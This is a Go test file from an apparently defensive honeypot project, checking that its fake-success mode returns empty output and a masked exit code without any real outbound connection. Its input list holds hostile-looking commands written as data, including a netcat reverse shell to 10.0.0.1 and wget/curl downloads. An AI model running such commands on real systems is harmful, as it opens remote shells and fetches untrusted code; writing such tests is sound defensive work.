package deception

import (
	"testing"
	"time"

	"github.com/mirage-source/mirage-core/internal/shell"
)

// TestFakeSuccessNeverMasksARealAttempt is the regression lock for the ROE in
// SECURITY.md: FAKE_SUCCESS may only rewrite an already-computed (response,
// code) pair -- it must never cause, or appear to have caused, a real
// outbound connection or payload execution. Apply (apply.go) only ever
// post-processes what internal/shell already produced; internal/shell's own
// no-egress guarantee (see internal/shell/no_egress_test.go) means every
// command below already resolves to "command not found" before Apply runs.
// This test locks in that the full RunWithDeception -> Apply chain still
// completes immediately and produces nothing beyond a masked exit code --
// never fabricated output that could read as real command results.
func TestFakeSuccessNeverMasksARealAttempt(t *testing.T) {
	commands := []string{
		"wget http://example.com/a",
		"curl -O http://example.com/b",
		"nc -e /bin/sh 10.0.0.1 4444",
		"ssh user@10.0.0.1",
	}

	for _, cmd := range commands {
		cmd := cmd
		t.Run(cmd, func(t *testing.T) {
			interp := shell.NewInterpreter("ubuntu")
			done := make(chan struct{})
			var response string
			var code int
			go func() {
				raw, rawCode, _ := interp.RunWithDeception(cmd, ActionFakeSuccess)
				response, code, _ = Apply(ActionFakeSuccess, raw, rawCode)
				close(done)
			}()
			select {
			case <-done:
			case <-time.After(2 * time.Second):
				t.Fatalf("FAKE_SUCCESS path for %q did not complete within 2s", cmd)
			}
			if code != 0 {
				t.Fatalf("FAKE_SUCCESS should mask the command-not-found exit code to 0, got %d", code)
			}
			if response != "" {
				t.Fatalf(
					"FAKE_SUCCESS should produce empty output, not fabricated data an attacker "+
						"could mistake for a real result (and potentially reuse against a third "+
						"party) -- got %q",
					response,
				)
			}
		})
	}
}
